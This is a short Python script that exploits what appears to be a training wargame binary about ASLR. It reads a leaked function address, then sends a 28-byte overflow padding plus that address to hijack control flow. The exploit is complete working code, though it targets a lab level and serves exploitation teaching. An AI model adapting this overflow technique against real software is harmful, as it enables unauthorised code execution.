#!/usr/bin/python

import pexpect
import struct

def exp(saddr):
    print saddr
    saddr = saddr[saddr.find('@')+2:]
    addr = int(saddr.strip(), 16)
    print '[?] i_am_rly_leet at 0x%x' % addr
    return "A" * 28 + struct.pack('<I', addr)

target = '/levels/lecture/aslr/aslr_leak1'
child = pexpect.spawn(target)

child.expect('Win Func @ .+')
child.sendline(exp(child.after))
child.interact()

